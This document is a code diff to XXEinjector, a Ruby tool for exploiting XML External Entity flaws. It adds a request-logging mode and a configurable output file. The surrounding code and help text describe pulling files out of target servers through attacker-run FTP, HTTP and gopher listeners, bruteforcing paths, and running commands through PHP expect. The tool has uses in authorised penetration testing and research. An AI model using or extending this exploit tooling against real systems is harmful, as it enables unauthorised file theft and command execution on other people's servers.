@@ -13,6 +13,7 @@ host = "" # our external ip
 path = "" # path to enumerate
 $file = "" # file with vulnerable HTTP request
 enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http
+logger = "n" # only log requests, do not send anything
 
 $proto = "http" # protocol to use - http/https
 $proxy = "" # proxy host
@@ -31,6 +32,7 @@ expect = "" # command that gets executed using PHP expect
 $xslt = "n" # tests for XSLT
 
 $dtdi = "y" # if yes then DTD is injected automatically
+output = "brute.log" # output file for brute and logger modes
 $verbose = "n" # verbose messaging
 timeout = 10 # timeout for receiving responses
 
@@ -67,6 +69,9 @@ ARGV.each do |arg|
 	$dtdi = "n" if arg.include?("--nodtd")
 	$xslt = "y" if arg.include?("--xslt")
 	$direct = arg.split("=")[1] if arg.include?("--direct=")
+	logger = "y" if arg.include?("--logger")
+	brute = "logger" if arg.include?("--logger")
+	output = arg.split("=")[1] if arg.include?("--output=")
 end
 
 # show DTD to inject
@@ -92,7 +97,7 @@ if ARGV.include? "--xml"
 end
 
 # show main menu
-if ARGV.nil? || ARGV.size < 3 || (host == "" && $direct == "") || $file == "" || (path == "" && brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n")
+if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == "" && logger == "n") || ($file == "" && logger == "n") || (path == "" && brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && logger == "n")
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
 	puts ""
 	puts "XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
@@ -102,6 +107,7 @@ if ARGV.nil? || ARGV.size < 3 || (host == "" && $direct == "") || $file == "" ||
 	puts "  --file	Mandatory - File containing valid HTTP request with xml. You can also mark with \"XXEINJECT\" a point where DTD should be injected. (--file=/tmp/req.txt)"
 	puts "  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)"
 	puts "  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
+	puts "  --logger	Log results only. Do not send requests."
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
 	puts "  --direct		Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
@@ -123,6 +129,7 @@ if ARGV.nil? || ARGV.size < 3 || (host == "" && $direct == "") || $file == "" ||
 	puts ""
 	puts "  --urlencode	URL encode injected DTD. This is default for URI."
 	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--dtd\" to show how DTD should look like."
+	puts "  --output	Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)"
 	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
 	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
 	puts "  --verbose	Show verbose messages."
@@ -146,6 +153,8 @@ if ARGV.nil? || ARGV.size < 3 || (host == "" && $direct == "") || $file == "" ||
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls"
 	puts "  Testing for XSLT injection:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --xslt"
+	puts "  Log requests only:"
+	puts "  ruby #{__FILE__} --logger --oob=http --output=/tmp/out.txt"
 	puts ""
 	exit(1)
 else
@@ -165,7 +174,7 @@ $response = ""
 regex = /^[$.\-_~ 0-9A-Za-z]+$/
 # array that holds filenames to enumerate
 filenames = Array.new
-# temp path holders - hold next filenames in different format being enumerated
+# temp path holders - hold next filenames in different formats for enumeration
 nextpath = ""
 enumpath = ""
 $directpath = ""
@@ -179,6 +188,7 @@ cmp = "" # holds user input
 switch = 0 # this switch locks enumeration if response is pending
 i = 0 # main counter
 $time = 1 # HTTP response timeout
+# set longer timeout for direct exploitation
 if $direct != ""
 	$time = 30
 end
@@ -467,7 +477,7 @@ end
 
 # Starting servers
 begin
-	if $xslt == "n" && enumports == "" && $direct == ""
+	if ($xslt == "n" && enumports == "" && $direct == "" && logger == "n") || (logger == "y" && enum == "http")
 		http = TCPServer.new http_port
 	end
 	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
@@ -571,7 +581,7 @@ loop do
 			
 			# retrieve p parameter value and respond
 			req = req.sub("GET /?p=", "").split(" ")[0]
-			client.print("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: plain/text\r\n\r\nThanks")
+			client.print("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\nThanks")
 
 			# base64 decode if parameter was encoded
 			if phpfilter == "y"
@@ -588,7 +598,7 @@ loop do
 
 				param = URI.decode(param)
 
-				# log to separate file or brute.log if in bruteforce mode
+				# log to separate file or output file if in bruteforce mode
 				if brute == ""
 					logpath = "#{path}"
 					if tmppath != ""
@@ -622,7 +632,7 @@ loop do
 					log.write param + "\n"
 					log.close
 				else
-					log = File.open("brute.log", "a")
+					log = File.open(output, "a")
 					log.write param + "\n"
 					puts "Bruteforced request logged: #{param}" if $verbose == "y"
 					log.close
@@ -699,7 +709,7 @@ if enum == "ftp"
 				exit(1)
 			end
 			
-			# log to separate file or brute.log if in bruteforce mode
+			# log to separate file or output file if in bruteforce mode
 			if brute == ""
 				logpath = ""
 				logpath += "#{path}"
@@ -734,7 +744,7 @@ if enum == "ftp"
 				log.write req
 				log.close
 			else
-				log = File.open("brute.log", "a")
+				log = File.open(output, "a")
 				log.write req
 				puts "Bruteforced request logged: #{req}" if $verbose == "y"
 				log.close
@@ -798,7 +808,7 @@ if enum == "gopher"
 			req.sub! 'gopher=', ''
 			req.split("\n").each do |param|
 
-				# log to separate file or brute.log if in bruteforce mode
+				# log to separate file or output file if in bruteforce mode
 				if brute == ""
 					logpath = ""
 					logpath += "#{path}"
@@ -833,7 +843,7 @@ if enum == "gopher"
 					log.write param + "\n"
 					log.close
 				else
-					log = File.open("brute.log", "a")
+					log = File.open(output, "a")
 					log.write param + "\n"
 					puts "Bruteforced request logged: #{param}" if $verbose == "y"
 					log.close
@@ -860,6 +870,16 @@ if enum == "gopher"
 		}
   	  end
 	end
+	end
+end
+
+# logger
+if logger == "y"
+	puts "You can now make requests."
+	puts "Enter \"exit\" to quit."
+	loop do
+		cmp = Readline.readline("> ", true)
+		exit(1) if cmp.chomp == "exit"
 	end
 end
 
@@ -994,7 +1014,7 @@ if brute == ""
 			else
 				$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
 					
-					# log to separate file or brute.log if in bruteforce mode
+					# log to separate file
 					logpath = "#{path}"
 					logpath = logpath.gsub('\\','/')
 					if logpath.include?("/")
@@ -1027,7 +1047,7 @@ if brute == ""
 		end
 	end
 
-		# Loop that checks if response with next file content was received by FTP/HTTP servers
+	# Loop that checks if response with next file content was received by FTP/HTTP server
 	if $direct == ""
 		loop do
 			sleep timeout
@@ -1135,7 +1155,7 @@ loop do
 							done = 0
 							$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
 
-								# log to separate file or brute.log if in bruteforce mode
+								# log to separate file
 								logpath = "#{path}"
 								logpath = logpath.gsub('\\','/')
 								if logpath.include?("/")
@@ -1182,7 +1202,7 @@ loop do
 		line = IO.readlines(brutefile)[i]
 		line = line.chomp
 
-		log = File.open( "brute.log", "a")
+		log = File.open(output, "a")
 		log.write "\n"
 		log.write "Filename: #{line}\n"
 		log.close
@@ -1217,7 +1237,7 @@ loop do
 			if not $response.body.include?("#{$direct}")
 				puts "Response does not contain unique mark." if $verbose == "y"
 			else
-				log = File.open("brute.log", "a")
+				log = File.open(output, "a")
 				log.write $response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n") + "\n"
 				puts "Bruteforced request logged: #{$directpath}" if $verbose == "y"
 				log.close
